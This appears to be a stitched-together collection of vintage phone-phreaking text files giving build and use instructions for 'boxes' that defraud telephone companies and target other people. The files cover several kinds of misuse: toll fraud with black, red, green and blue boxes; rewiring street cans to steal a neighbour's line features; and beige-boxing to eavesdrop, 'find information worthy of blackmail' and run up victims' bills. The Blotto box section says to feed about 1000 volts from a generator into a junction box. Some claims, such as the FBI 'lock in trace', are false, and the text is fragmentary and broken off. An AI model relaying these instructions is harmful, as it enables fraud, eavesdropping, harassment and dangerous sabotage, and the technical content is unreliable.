   IT WILL TAKE MANY YEARS FOR CCIS TO BE UNIVERSALLY USED, BUT IT IS GOING IN
FAST.  AS LONG AS THERE IS ONE NON-CCIS LINK IN THE NETWORK, THE HACKERS WILL
FIND IT AND PLY THEIR HOBBY.

   TO AVOID GETTING CAUGHT:  DON'T USE YOUR BOX FROM THE SAME PLACE REPEATEDLY.
DON'T COMPLETE CALLS TO FRIENDS AND SIT AND GAB -- IF NO "SIGNS AND SIGNALS" ARE
TRANSMITTED (YOU DON'T PASS INFORMATION -- YOU DON'T COMMUNICATE) YOU HAVE NOT
COMMITTED FRAUD BY WIRE.  YOU MAY GET CHARGED WITH POSSESSION, IF THE STATE LAWS
WHERE YOU ARE CAUGHT MAKE BOXES ILLEGAL (HMMM.  LIKE GUN CONTROL -- MAYBE YOU
HAVE THE BOX IN CASE OF AN EMERGENCY WHEN THE NETWORK ISN'T WORKING RIGHT -- TO
SAVE YOUR LIFE -- BUT IT CAN BE USED TO COMMIT A CRIME.  ENOUGHT OF THAT
NONSENSE).

   THE SECOND FAMOUS BOX IS THE BLACK BOX.  WITH THE BLACK BOX, YOU RECEIVE
CALLS WITHOUT THE CALLER BEING CHARGED.  THIS IS USELESS FOR HACKERS -- ONLY THE
FREEPHONE PEOPLE ARE INTERESTED.  AN EARLIER MESSAGE TALK ABOUT THE WIRES THAT
GO TO THE INTERRUPTER SWITCH IN YOUR ROTARY DIAL.  THIS IS THE BASIC INGREDIENT
IN THE BLACK BOX.  THE ONLY ADDITIONAL EQUIPMENT NEEDED IS A BATTERY TO POWER
YOUR CARBON MIKE.  USING THE BLACK BOX, THE CALLEE GOES OFF-HOOK VERY BRIEFLY,
ENOUGH TO STOP THE RINGING (SOME BLACK BOXERS HAVE BEEN KNOW TO TALK BETWEEN THE
RINGS) BUT NOT ENOUGH TO SEND ANYTHING BACK DOWN THE TRUNK TO THE CALLER SAYING
THAT THE PHONE HAD BEEN ANSWERED AND HUNG UP.  THIS WORKS IN STEP-BY-STEP (SXS)
OFFICES, NO 1 AND 5 CROSSBAR, AND SOME NON-BELL OFFICES.  BELL'S ESS OFFICES ARE
TOO CLEVER FOR THIS TRICK - YOUR PHONE ISN'T CONNECTED TO THE INCOMING TRUNK
UNLESS YOU ARE OFF-HOOK.

   MA BELL CATCHES BLACK BOXERS BY EXAMINING TRUNK RECORDS.  WHY WAS THE TRUNK
IN USE FOR SO LONG, BUT NOT OFF HOOK?  IN NO 5 XBAR OFFICES THERE WILL ALSO BE
FUNNY ACCOUNT ENTRIES -- ORIGINATE FOLLOWED BY DISCONNECT -- A LONG TIME LATER
-- WITH NO ANSWER IN BETWEEN.  ESS OFFICES CAN GENERATE THIS DATA WHEN AUDITS
ARE DONE (A RANDOM OCCURANCE).

   THE BEST WAY TO AVOID BEING CAUGHT IS TO STAY AWAY FROM THIS ONE.  AT LEAST
KEEP YOUR CALLS SHORT -- THE LENGTH OF 15-20 RINGS OR SO.

   THE FINAL FAMOUS BOX IS THE RED BOX.  THIS IS THE ELECTRONIC EQUIVALENT OF
THE CHIME PEOPLE USED TO TAKE TO A PAY PHONE SO THAT THE OPERATOR THINKS MONEY
IS BEING DEPOSITED.  THE GONGS WERE EASY TO RECORD OR OBTAIN AND OPERATORS COULD
BE EASILY FOOLED.  THE NEWER PHONES WITH THE BEEPS MADE IT NECESSARY TO COME UP
WITH SOMETHING MORE PRECISE.

   PEOPLE GET CAUGHT WHEN AN OPERATOR GETS SUSPICIOUS AND CALLS SECURITY, OR
WHEN THE ACCOUNTING INFO FOR THE PHONE SAYS THERE ISN'T ENOUGH MONEY IN THE COIN
BOX.  BELL SECURITY THEN STAKES OUT THE PAY PHONE -- AND ZAP.  NEVER USE THE
SAME PAY PHONE TWICE.  (END OF BASICS.  MORE SOMEDAY)

Ok the purpose of this box is to get Three-Way-Calling, Call Waiting,
programmable Call Forwarding, and an easier way of extended Bud Boxing ALL for
FREE.


Materials:

1) Wire stripers
2) Couple Feet Wire
3) AT&T/BELL Can
4) Hex Wrench

Idea: Ok the idea of this box is to get all of the above features by stealing
them from the fortunate ones on your block.

Procedure:

Step 1) Find AT&T/BELL Can that is being used to service you surrounding area.

Step 2) Open can with Hex wrench.

Step 3) Find your line and another persons line who has 3-way, Call
(waiting/forwarding), if the # of all the lines are not listed in the box you
will have to use your local ANI to find them.

Step 4) Once you have found the lines then wire the (Black & Yellow) wires on
the victims line to the (Black & Yellow) wires on you line (Be sure your phone
at home uses all 4 wire as some of the cheap phones don't).

Step 5) Then disconnect the victims (Black & Yellow) Wires, resulting the the
loss of these features to their line ( you mat want to leave these wires
connected, this may or may not cause problems I haven't tried it that may yet)

The Chartreuse Box               Brought to you by         Wonko The Sane 

            The Chartreuse Box, so named because this is an obnoxious box
       and  chartreuse  is  an  obnoxious  color,  is  designed  to  take
       advantage of the thousands of dollars Ma Bell pays to the electric
       company each day.   As you know, your telephone line is a constant
       power source.   The chart box is designed to allow you to tap that
       power source for whatever sicko purposes you might have in mind.

       Parts
       -----

       [1]- 1 four prong to modular phone adapter (the rectangular beige
            boxes with phone line jacks at one end and four prongs out
            the other.)
       [2]- 1 low power broad range rheostate.
       [3]- some wire
       [4]- a soldering iron
       [5]- some electric tape
       [6]- a 70 vlt. DC fuse (optional)
       [7]- 1 SPST switch

       Assembly
       --------

            Plug the adapter into a phone line,  and use a multitester to
       note  which  posts are charged.   Use a magic marker to  mark  the
       positive and negative poles.  Do this first.
            Take  the  adapter,  and turn it  upside  down.   You  should
       observe  that the bottom fits into the top.   Use  a  pocketknife,
       small  screwdriver,  battle axe etc. to remove the bottom.   Don't
       break it.
            Detach  the  two wires not connected to  charged  poles,  and
       scrap  em.   Detach  the  other two  wires  as  well.   Take  your
       rheostat, and mount it on the outside of the box, drilling a small
       hole in the box, to run wires through.
            Run  wire  from the charged connections from the  line  jack,
       through the rheostat, to the charged poles.  (see diagram).

             . - Wiring path
            [=]- Outside posts

            Attach  the fuse somewhere in the line if you feel  like  it.
       When  the phone rings 90 volts of pulsing DC power get  shot  down
       your line,  and can really fuck up whatever you have the chart box
       hooked up to.  Therefore, the fuse is a good idea.
            You can also hook a switch up to the wiring, to give you more
       control  over when power starts to flow.   Once all the wiring  is
       complete, push the wires and the fuse into the casing, and reclose
       it.   Then tape around the side of the box, to hold the wires that
       come  out to the rheostat down.  I highly recommend that you  mark
       the charged posts with a marker, so you can easily identify them.


       Use
       ---

            To use the chart box, hook it up to a phone line, and grab a
       multitester or voltmeter.  Use the voltmeter to read off the
       voltage from your chart box.  You can get up to 12 volts (more if
       you use a transformer) from the box, but you can use the rheostat
       to calibrate the box for whatever voltage you need.  Once the
       voltage is set, remove the box from the line, hook your device up
       to the charged poles, and plug the box back in.  If you're really
       in a constructive mood, build a switch into the box.  Now leech Ma
       Bell's precious energy to your hearts content.

       Footnote
       --------

            This device has other potential uses.  One of the most
       obvious, and least useful (at least to my view) is as a volume
       control for your phone.  Maybe you have an aunt that talks REAL
       LOUD!!!!!   Also, you can use this device to set up a feedback
       loop to mess up someone else's phone line.  Finally, it may be
       possible to use the chart box to tone down your connection, and
       provide a little background noise, so that ESS doesn't pick up on
       your blue boxing.  This is not a guaranteed method, but if you do
       it just right, you can make the 2600 blast sneak by the ESS
       detection code.
            Naturally, the main purpose of the chart box is to leech Ma
       Bell just like she leeches you.

High Tech Revenge: The Beigebox                        by -= Exodus =-
   
             -------------Introduction-------------
Have you ever wanted a lineman's handset? Surely every phreak has at
least once considered the phun that he could have with one. After searching
unlocked phone company trucks for months, we had an idea. We could build
one. We did, and named it the "Beige Box" simply because that is the color
of ours. 
The beigebox is simply a consumer lineman's handset, which is a 
phone that can be attached to the outside of a person's house.  To 
fabricate a beigebox, follow along.

             ---------Construction and Use---------
The construction is very simple. First you must understand the concept of
the device. In a modular jack, there are four wires. These are red, green,
yellow, and black. For a single line telephone, however, only two matter:
the red (ring) and green (tip). The yellow and the black are not neccessary
for this project. A lineman's handset has two clips on it: the ring and
the tip. Take a modular jack and look at the bottom of it's casing. There
should be a grey jack with four wires  (red, green, yellow & black)
leading out of it. To the end of the red wire attach a red aligator clip.
To the end of the green wire attatch a green aligator clip. The yellow
and black wires can be removed, although I would only set them aside so
that you can use the modular jack in future projects. Now insert your
telephone's modular plug into the modular jack. That's it. This particular
model is nice because it is can be easily made, is inexpensive, uses
common parts that are readily available, is small, is lightweight,
and does not require the destruction of a phone.

             ------------Beige Box Uses------------
There are many uses for a Beige Box. However, before you can use it,
you must know how to attach it to the output device. This device can be
of any of Bell switching apparatus that include germinal sets (i.e.
remote switching centers, bridgin heads, cans, etc.). To open most Bell
Telephone switching apparatus, you must have a 7/16 inch hex driver
(or a good pair of needle nose pliers work also).
This piece of equipment can be picked up at your local hardware store.
With your hex driver (or pliers), turn the security bolt(s) approximately
1/8 of an inch counter-clockwise and open. If your output device is locked,
then you must have some knowledge of destroying and/or picking locks.
However, we have never encountered a locked output device. Once you have
opened your output device, you should see a mass of wires connected to
terminals. On most output devices, the terminals should be labeled "T"
(Tip -- if not labeled, it is usually on the left) and "R" (Ring -- if
not labeled, usually on the right).

Remember: Ring - red - right. The "Three R's" -- a simple way to
remember which is which. Now you must attach all the red alligator clip
(Ring) to the "R" (Ring) terminal.
Attach the green alligator clip (Tip) to the "T" (Tip) terminal.

Note: If instead of a dial tone you hear nothing, adjust the alligator
clips so that they are not touching each other terminals. Also make sure
they are firmly attached. By this time you should hear a dial tone.
Dial ANI to find out the number you are using (you wouldn't want to use
your own). Here are some practicle aplications:

       > Eavesdropping
       > Long distance, static free free fone calls to phriends
       > Dialing direct to Alliance Teleconferencing (also no static)
       > Phucking people over
       > Bothering the operator at little risk to yourself
       > Blue Boxing with greatly reduced chance of getting caught
       > Anything at all you want, since you are on an extension of that line.

Eavesdropping
-------------
To be most effective, first attach the Beige Box then your phone. This
eliminates the static caused by connecting the box, therefore
reducing the potential suspicion of your victim. When eavesdropping,
it is allways best to be neither seen nor heard. If you hear someone
dialing out, do not panic; but rather hang up, wait, and pick up the
receiver again. The person will either have hung up or tried to complete
their call again. If the latter is true, then listen in, and perhaps you
will find information worthy of blackmail! If you would like to know who
you are listening to, after dialing ANI, pull a CN/A on the number.

Dialing Long Distance
---------------------
This section is self explanitory, but don't forget to dial a "1" before
the NPA.

Dialing Direct to Aliance Teleconferencing
------------------------------------------
Simply dial 0-700-456-1000 and you will get instructions from there.
I prefer this method over PBX's, since PBX's often have poor reception
and are more dificult to come by.

Phucking People Over
--------------------
This is a very large topic of discussion. Just by using the other topics
described, you can create a large phone bill for the person (they will
not have to pay for it, but it will be a big hassle for them). In addition,
since you are an extension of the person's line, you can leave your
phone off the hook, and they will not be able to make or receive calls.
This can be extremely nasty because no one would expect the cause
of the problem. 

Bothering the Operator
----------------------
This is also self explanitary and can provide hours of entertainment.
Simply ask her things that are offensive or you would not like traced
to your line. This also corresponds to the previously described section,
Phucking People Over. After all, guess who's line it gets traced to?
He he he...

Blue Boxing
-----------
See a file on Blue Boxing for more details. This is an especially nice
feature if you live in an ESS-equiped prefix, since the calls are, once
again, not traced to your line...

---POTENTIAL RISKS OF BEIGE BOXING----
Overuse of the Beige Box may cause suspicians within the Gestapo,
and result in legal problems. Therefore, I would recomend you:

            > Choose a secluded spot to do your Beige Boxing,
            > Use more than one output device
            > Keep a low profile (i.e., do not post under your real
              name on a public BBS concerning your occomplishments)
            > In order to make sure the enemy has not been inside your output
              device, I recomend you place a piece of transparent tape over
              the opening of your output device. Therefor, if it is
              opened in your abscence, the tapqe will be displaced and
              you will be aware of the fact that someone has intruded
              on your teritory.

Now, imagine the possibilities:  a $2000 dollar phone bill for 
that special person, 976 numbers galore, even harassing the 
operator at no risk to you!  Think of it as walking into an 
enemies house, and using their phone to your heart's content.

Every true phreaker lives in fear of the dreadded F.B.I. 'Lock In Trace.'
For a long time, it was impossible to escape from the Lock In Trace.
This box does offer an escape route with simple directions to it.
This box is quite a simple concept, and almost any phreaker with basic
electronics knowledge can construct and use it.

The Lock In Trace
------------------
A lock in trace is a device used by the F.B.I. to lock into the phone
users location so that he can not hang up while a trace is in progress.
For those of you who are not familiar with the conecpt of 'locking in',
then here's a brief desciption. The F.B.I. can tap into a conversation,
sort of like a three-way call connection. Then, when they get there,
they can plug electricity into the phone line. All phone connections
are held open by a certain voltage of electricity.
That is why you sometimes get static and faint connections when you are
calling far away, because the electricity has trouble keeping the line
up. What the lock in trace does is cut into the line and generate that same
voltage straight into the lines. That way, when you try and hang up, voltage
is retained. Your phone will ring just like someone was calling you
even after you hang up. (If you have call waiting, you should understand
better about that, for call waiting intersepts the electricity and makes
a tone that means someone is going through your line. Then, it is a matter
of which voltage is higher. When you push down the receiver,then it see-saws
the electricity to the other side. When you have a person on each line
it is impossible to hang up unless one or both of them will hang up.
If you try to hang up, voltage is retained, and your phone will ring.
That should give you an understanding of how calling works. Also, when
electricity passes through a certain point on your phone, the electricity
causes a bell to ring, or on some newer phones an electronic ring to sound.)
So, in order to eliminate the trace, you somehow must lower the
voltage level on your phone line. You should know that every time
someone else picks up the phone line, then the voltage does decrease
a little. In the first steps of planning this out, Xerox suggested getting
about a hundred phones all hooked into the same line that could all
be taken off the hook at the same time. That would greatly decrease the
voltage level. That is also why most three-way connections that are using
the bell service three way calling (which is only $3 a month) become quite
faint after a while. By now, you should understand the basic idea. You
have to drain all of the power out of the line so the voltage can
not be kept up. Rather sudden draining of power could quickly short out
the F.B.I. voltage machine, because it was only built to sustain
the exact voltage nessecary to keep the voltage out. For now, imagine
this. One of the normal Radio Shack generators that you can go
pick up that one end of the cord that hooks into the central box has a 
phone jack on it and the other has an electrical plug. This way, you
can "flash" voltage through the line, but cannot drain it. So, some
modifications have to be done.

Materials
----------
A BEOC (Basic Electrical Output Socket), like a small lamp-type
connection, where you just have a simple plug and wire that would plug
into a light bulb.
One of cords mentioned above, if you can't find one then construct your
own... Same voltage connection, but the restrainor must be built in (I.E.
The central box)
Two phone jacks (one for the modem, one for if you are being traced to
plug the aqua box into)
Some creativity and easy work.

*Notice: No phones have to be destroyed/modified to make this box, so
don't go out and buy a new phone for it!

Procedure
---------
All right, this is a very simple procedure. If you have the BEOC, it could
drain into anything: a radio, or whatever. The purpose of having
that is you are going to suck the voltage out from the phone line into
the electrical appliance so there would be no voltage left to lock
you in with.
1)Take the connection cord. Examine the plug at the end. It should have
only two prongs. If it has three, still, do not fear. Make sure the
electrical appliance is turned off unless you wanna become a crispy critter
while making this thing. Most plugs will have a hard plastic design on the
top of them to prevent you from getting in at the electrical wires inside.
Well, remove it. If you want to keep the plug (I don't see why...)
then just cut the top off. When you look inside, Lo and Behold,
you will see that at the base of the prongs there are a few wires
connecting in. Those wires conduct the power into the appliance.
So, you carefully unwrap those from the sides and pull them out until
they are about an inch ahead of the prongs. If you don't wanna keep the
jack, then just rip the prongs out. If you are, cover the prongs with
insultation tape so they will not connect with the wires when the power
is being drained from the line.
2)Do the same thing with the prongs on the other plug, so you have the
wires evenly connected. Now, wrap the end of the wires around each other.
If you happen to have the other end of the voltage cord hooked into the
phone, stop reading now, you're too fucking stupid to continue. After
you've wrapped the wires around each other, then cover the whole thing with
the plugs with insulating tape. Then, if you built your own control box
or if you bought one, then cram all the wires into it and reclose it.
That box is your ticket out of this.
3)Re-check everything to make sure it's all in place. This is a pretty
flimsy connection, but on later models when you get more experienced at
it then you can solder away at it and form the whole device into one
big box, with some kind of cheap mattel hand-held game inside to be
the power connector.  In order to use it, just keep this box handy.
Plug it into the jack if you want, but it will slightly lower the
voltage so it isn't connected. When you plug it in, if you see sparks,
unplug it and restart the whole thing. But if it just seems fine then leave it.

Use
----
Now, so you have the whole thing plugged in and all... Do not use this
unless the situation is desperate! When the trace has gone on, don't
panic, unplug your phone, and turn on the appliance that it was hooked
to. It will need energy to turn itself on, and here's a great source...
The voltage to keep a phone line open is pretty small and a simple light
bulb should drain it all in and probably short the F.B.I. computer at
the same time.

Happy boxing and stay free!               ------------RFLAGGBlack Box Plans                                 by The Jolly Roger

Introduction:
------------
At any given time, the voltage running through your phone is about 20
Volts. When someone calls you, this voltage goes up to 48 Volts and rings
the bell. When you answer, the voltage goes down to about 10 Volts.
The phone company pays attention to this. When the voltage drops to 10,
they start billing the person who called you.

Function:
--------
The Black Box keeps the voltage going through your phone at 36 Volts,
so that it never reaches 10 Volts. The phone company is thus fooled
into thinking you never answered the phone and does not bill the caller.
However, after about a half hour the phone company will get suspicious
and disconnect your line for about 10 seconds.

Materials:
---------
1 1.8K 1/2 Watt Resistor
1 1.5V LED
1 SPST Switch

Procedure:
---------
(1) Open your phone by loosening the two screws on the bottom and
lifting the case off.
(2) There should be three wires: Red, Green, and Yellow. We'll be working
with the Red Wire.
(3) Connect the following in parallel:
     A. The Resistor and LED.
     B. The SPST Switch.
In other words, you should end up with this:
              (Red Wire)
           !---/\/\/\--O--!
(Line)-----!              !-----(Phone)
           !-----_/_------!
          /\/\/\ = Resistor
          O      = LED
          _/_    = SPST

Use:
---
The SPST Switch is the On/Off Switch of the Black Box. When the box is off,
your phone behaves normally. When the box is on and your phone rings,
the LED flashes. When you answer, the LED stays on and the voltage
is kept at 36V, so the calling party doesn't get charged. When the box
is on, you will not get a dial tone and thus cannot make calls.
Also remember that calls are limited to half an hour.

                                      ------------Exodus

p.s. Due to new Fone Company switching systems & the like, this 
may or may not work in your area. If you live in bumfuck Kentucky, 
then try this out. I make no guarantees! (I never do...) ----RF.


The Infamous Blotto Box!!                       by The Jolly Roger
      
        (I bet that NOONE has the balls to build this one!)

Finally, it is here! What was first conceived as a joke to fool the innocent
phreakers around America has finally been conceived!
Well, for you people who are unenlightened about the Blotto Box,
here is a brief summery of a legend.

--*-=> The Blotto Box <=-*--

For years now every pirate has dreamed of the Blotto Box. It was at first
made as a joke to mock more ignorant people into thinking that
the function of it actually was possible. Well, if you are The Voltage
Master, it is possible. Originally conceived by King Blotto of much fame,
the Blotto Box is finally available to the public.
NOTE: Jolly Roger can not be responsible for the information disclosed
in the file! This file is strictly for informational purposes and
should not be actually built and used! Usage of this electronical impulse
machine could have the severe results listed below and could result in
high federal prosecution! Again, I TAKE NO RESPONSIBILITY!
All right, now that that is cleared up, here is the basis of the box
and it's function.
The Blotto Box is every phreaks dream... you could hold AT&T down on its
knee's with this device. Because, quite simply, it can turn off the phone
lines everywhere. Nothing. Blotto. No calls will be allowed out of an area
code, and no calls will be allowed in. No calls can be made inside it for
that matter. As long as the switching system stays the same, this box will
not stop at a mere area code. It will stop at nothing. The electrical
impulses that emit from this box will open every line. Every line will
ring and ring and ring... the voltage will never be cut off until the
box/generator is stopped. This is no 200 volt job, here.
We are talking GENERATOR. Every phone line will continue to ring, and people
close to the box may be electricuted if they pick up the phone.
But, the Blotto Box can be stopped by merely cutting of the line or generator.
If they are cut off then nothing will emit any longer. It will take
a while for the box to calm back down again, but that is merely a
superficial aftereffect. Once again: Construction and use of this box is
not advised! The Blotto Box will continue as long as there is
electricity to continue with.
OK, that is what it does, now, here are some interesting things for you
to do with it...

-*-=>Blotto Functions/Installin'<=-*-

Once you have installed your Blotto, there is no turning back. The
following are the instructions for construction and use of this box.
Please read and heed all warnings in the above section before you attempt
to construct this box.

Materials:
  - A Honda portable generator or a main power outlet like in a 
    stadium or some such place.
  - 400 volt rated coupler that splices a female plug into a
    phone line jack.
  - A meter of voltage to attach to the box itself.
  - A green base (i.e. one of the nice boxes about 3' by 4' that
    you see around in your neighborhood. They are the main switch
    boards and would be a more effective line to start with.
    or: A regular phone jack (not your own, and not in your area
    code!
  - A soldering iron and much solder.
  - A remote control or long wooden pole.
Now. You must have guessed the construction from that. If not, here goes,
I will explain in detail. Take the Honda Portable Generator and all of
the other listed equiptment and go out and hunt for a green base. Make
sure it is one on the ground or hanging at head level from a pole,
not the huge ones at the top of telephone poles. Open it up with anything
convienent, if you are two feeble that fuck don't try this.
Take a look inside... you are hunting for color-coordinating lines of
green and red. Now, take out your radio shack cord and rip the meter thing
off. Replace it with the voltage meter about. A good level to set the
voltage to is about 1000 volts. Now, attach the voltage meter to the cord
and set the limit for one thousand. Plug the other end of the cord
into the generator. Take the phone jack and splice the jack part off.
Open it up and match the red and green wires with
the other red and green wires. NOTE: If you just had the generator on
and have done this in the correct order, you will be a crispy critter.
Keep the generator off until you plan to start it up. Now, solder those
lines together carefully. Wrap duck tape or insultation tape around all
of the wires. Now, place the remote control right on to the startup
of the generator. If you have the long pole, make sure it is very long
and stand back as far away as you can get and reach the pole over.
NOTICE: If you are going right along with this without reading the file
first, you still realize now that your area code is about to become
null! Then, getting back, twitch the pole/remote control and run for your
damn life. Anywhere, just get away from it. It will be generating
so much electricity that if you stand to close you will kill yourself.
The generator will smoke, etc. but will not stop. You are now killing your
area code, because all of that energy is spreading through all of the
phone lines around you in every direction.

Have a nice day!

This is a fairly simple mod that can be made to any phone. All it does 
is allow you to take any two lines in your house and create a party
line. So far I have not heard of anyone who has any problems
with it. There is one thing that you will notice when you are
one of the two people who is called by a person with a brown box. The other
person will sound a little bit faint. I could overcome this with some 
amplifiers but then there wouldn't be very many of these made [Why not?].
I think the convenience of having two people on the line at once will 
make up for any minor volume loss.

Clear Box Plans                                 by The Jolly Roger

The clear box is a new device which has just been invented that can be
used throughout Canada and rural United States. The clear box works on
"PostPay" payphones (fortress fones). Those are the payphones
that don't require payment until after the connection is established.
You pick up the fone, get a dial tone, dial your number, and then
insert your money after the person answers.
If you don't deposit the money then you can not speak to the person on
the other end because your mouth piece is cut off but not the ear-piece.
(obviously these phones are nice for free calls to weather or time or
other such recordings). All you must do is to go to your nearby Radio
Shack, or electronics store, and get a four-transistor amplifier and a
telephone suction cup induction pick-up. The induction pick-up would be
hooked up as it normally would to record a conversation, except
that it would be plugged into the output of the amplifier and a
microphone would be hooked to the input. So when the party
that is being called answers, the caller could speak through the little
microphone instead. His voice then goes through the amplifier and out
the induction coil, and into the back of the receiver where
it would then be broadcast through the phone lines and the other 
partywould be able to hear the caller. The Clear Box thus
'clears up' the problem of not being heard. Luckily, the line will
not be cut-off after a certain amount of time because it will wait
forever for the coins to be put in.
The biggest advantage for all of us about this new clear box is the
fact that this type of payphone will most likely become very common.
Due to a few things: 1st, it is a cheap way of getting the DTF,
dial-tone-first service, 2nd, it doesn't require any special equipment,
(for the phone company) This payphone will work on any phone line.
Usually a payphone line is different, but this is a regular phone line
and it is set up so the phone does all the charging, not the company.

                              ------------RFLAGGGreen Box Plans                                 by the Jolly Roger

Paying the initial rate in order to use a red box (on certain 
fortresses) left a sour taste in many red boxers mouths, thus the 
green box was invented. The green box generates useful tones such as
COIN COLLECT, COIN RETURN, AND RINGBACK. These are the tones that
ACTS or the TSPS operator would send to the CO when appropriate.
Unfortunately, the green box cannot be used at the fortress station but
must be used by the CALLED party.

Here are the tones:
COIN COLLECT     700+1100hz
COIN RETURN      1100+1700hz
RINGBACK         700+1700hz

Before the called party sends any of these tones, an operator realease
signal should be sent to alert the MF detectors at the CO.
This can be done by sending 900hz + 1500hz or a single 2600 wink (90 ms.)
Also do not forget that the initial rate is collected shortly before the
3 minute period is up. Incidentally, once the above MF 
tones for collecting and returning coins reach the CO, they are 
converted into an appropriate DC pulse (-130 volts for return and
+130 for collect). This pulse is then sent down the tip to the 
fortress. This causes the coin relay to either return or collect the coins.
The alledged "T-network" takes advantage of this information.
When a pulse for coin collect (+130 VDC) is sent down the line,
it must be grounded somewhere. This is usually the yellow or black wire.
Thus, if the wires are exposed, these wires can be cut to prevent
the pulse from being grounded. When the three minute initial
period is almost up, make sure that the black and yellow wires are
severed, then hang up, wait about 15 seconds in case of a second
pulse, reconnect the wires, pick up the phone, and if all goes well,
it should be "JACKPOT" time.

Blue Box                               courtesy of the Jolly Roger

To quote Karl Marx, blue boxing has always been the most noble form of
phreaking. As opposed to such things as using an MCI code to make a free
fone call, which is merely mindless pseudo-phreaking, blue boxing
is actual interaction with the Bell System toll network.
It is likewise advisable to be more cautious when blue boxing, but the
careful phreak will not be caught, regardless of what type of switching
system he is under.
In this part, I will explain how and why blue boxing works, as well as
where. In later parts, I will give more practical information for blue
boxing and routing information. To begin with, blue boxing is simply
communicating with trunks. Trunks must not be confused with subscriber
lines (or "customer loops") which are standard telefone lines. Trunks are
those lines that connect central offices. Now, when trunks are not in
use (i.e., idle or "on-hook" state) they have 2600Hz applied to them. If
they are two-way trunks, there is 2600Hz in both directions. When a trunk
IS in use (busy or "off-hook" state), the 2600Hz is removed from the side
that is off-hook. The 2600Hz is therefore known as a supervisory
signal, because it indicates the status of a trunk; on hook (tone) or
off-hook (no tone). Note also that 2600Hz denoted SF (single frequency)
signalling and is "in-band." This is very important. "In-band" means that
is within the band of frequencies that may be transmitted over normal
telefone lines. Other SF signals, such as 3700Hz are used also. However,
they cannot be carried over the telefone network normally (they are
"out-of-band" and are therefore not able to be taken advantage of as
2600Hz is. Back to trunks. Let's take a hypothetical phone call. You pick
up your fone and dial 1+806-258-1234 (your good friend in Amarillo, Texas).
For ease, we'll assume that you are on #5 Crossbar switching and not in the
806 area. Your central office (CO) would recognize that 806 is a foreign
NPA, so it would route the call to the toll centre that serves you.
[For the sake of accuracy here, and for the more experienced readers,
note that the CO in question is a class 5 with LAMA that uses out-of-band
SF supervisory signalling]. Depending on where you are in the country,
the call would leave your toll centre (on more trunks) to another toll
centre, or office of higher "rank". Then it would be routed to central
office 806-258 eventually and the call would be completed.

            Illustration
A---CO1-------TC1------TC2----CO2----B

A.... you
CO1=your central office
TC1.. your toll office.
TC2.. toll office in Amarillo.
CO2.. 806-258 central office.
B.... your friend (806-258-1234)

In this situation it would be realistic to say that CO2 uses SF
in-band (2600Hz) signalling, while all the others use out-of-band signal-
ling (3700Hz). If you don't understand this, don't worry. I am pointing
this out merely for the sake of accuracy. The point is that while you
are connected to 806-258-1234, all those trunks from YOUR central office
(CO1) to the 806-258 central office (CO2) do *NOT* have 2600Hz on them,
indicating to the Bell equipment that a call is in progress and the trunks
are in use.
Now let's say you're tired of talking to your friend in Amarillo, so you
send a 2600Hz down the line. This tone travels down the line to your
friend's central office (CO2) where it is detected. However, that CO thinks
that the 2600Hz is originating from Bell equipment, indicating to it
that you've hung up, and thus the trunks are once again idle (with 2600Hz
present on them). But actually, you have not hung up, you have fooled the
equipment atyour friend's CO into thinking you have. Thus,it disconnects
him and resets the equipment to prepare for the next call. All this happens
very quickly (300-800ms for step-by-step equipment and 150-400ms for other
equipment). When you stop sending 2600Hz (after about a second), the
equipment thinks that another call is coming towards
--> on hook, no tone -->off hook.
Now that you've stopped sending 2600Hz, several things happen:

1) A trunk is seized.
2) A "wink" is sent to the CALLING end from the CALLED end indicating that
the CALLED end (trunk) is not ready to receive digits yet.
3) A register is found and attached to the CALLED end of the trunk within
about two seconds (max).
4) A start-dial signal is sent to the CALLING end from the CALLED end
indicating that the CALLED end is ready to receive digits.
Now, all of this is pretty much transparent to the blue boxer. All he
really hears when these four things happen is a <beep><kerchunk>. So,
seizure of a trunk would go something like this:

1> Send a 2600Hz
2> Terminate 2600Hz after 1-2 secs.
3> [beep][kerchunk]

Once this happens, you are connected to a tandem that is ready to obey your
every command. The next step is to send signalling information in order to
place your call. For this you must simulate the signalling used by
operators and automatic toll-dialing equipment for use on trunks. There are
mainly two systems, DP and MF. However, DP went out with the dinosaurs, so
I'll only discuss MF signalling. MF (multi-frequency) signalling is the
signalling used by the majority of the inter- and intra-lata network. It is
also used in international dialing known as the CCITT no.5 system.
MF signals consist of 7 frequecies, beginning with 700Hz and separated by
200Hz. A different set of two of the 7 frequencies represent the digits 0
thru 9, plus an additional 5 special keys. The frequencies and uses are as
follows:

Frequencies (Hz)  Domestic    Int'l
-------------------------------------
 700+900             1          1
 700+1100            2          2
 900+1100            3          3
 700+1300            4          4
 900+1300            5          5
1100+1300            6          6
 700+1500            7          7
 900+1500            8          8
1100+1500            9          9
1300+1500            0          0
 700+1700           ST3p       Code 1
 900+1700           STp        Code 1
1100+1700           KP         KP1
1300+1700           ST2p       KP2
1500+1700           ST         ST
 The timing of all the MF signals is a nominal 60ms, except for KP, which
should have a duration of 100ms. There should also be a 60ms silent period
between digits. This is very flexible however, and most Bell equipment will
accept outrageous timings. In addition to the standard uses
listed above, MF pulsing also has expanded usages known as "expanded
inband signalling" that include such things as coin collect, coin return,
ringback, operator attached, and operator attached, and operator
released. KP2, code 11, and code 12 and the ST_ps (STart "primes" all have
special uses which will be mentioned only briefly here.
To complete a call using a blue box once seizure of a trunk has been
accomplished by sending 2600Hz and pausing for the <beep><kerchunk>, one
must first send a KP. This readies the register for the digits that follow.
For a standard domestic call, the KP would be followed by either 7 digits
(if the call were in the same NPA as the seized trunk) or 10 digits (if the
call were not in the same NPA as the seized trunk). [Exactly like dialing
normal fone call]. Following either the KP and 7 or 10 digits, a STart is
sent to signify that no more digits follow. Example of a complete call:

1> Dial 1-806-258-1234
2> wait for a call-progress indication (such as ring,busy,recording,etc.)
3> Send 2600Hz for about 1 second.
4> Wait for about ll-progress indication (such as ring,busy,recording,etc.)
5> Send KP+305+994+9966+ST
The call will then connect if everything was done properly. Note that if a
call to an 806 number were being placed in the same situation, the are code
would be omitted and only KP + seven digits + ST would be sent.
Code 11 and code 12 are used in international calling to request
certain types of operators. KP2 is used in international calling to route a
call other than by way of the normal route, whether for economic or
equipment reasons. STp, ST2p, and ST3p (prime, two prime, and three prime)
are used in TSPS signalling to indicate calling type of call (such as
coin-direct dialing.

The Pearl Box:Definition - This is a box that may substitute for many boxes
which produce tones in hertz. The Pearl Box when operated correctly can
produce tones from 1-9999hz. As you can see, 2600, 1633, 1336 and other
crucial tones are obviously in its sound spectrum.

       capacitors
Q1.....NPN transistor (2N2222 works

Now that you are probably thoroughly confused, let me explain a few
minor details. The potentiometer area is rigged so that the left pole is
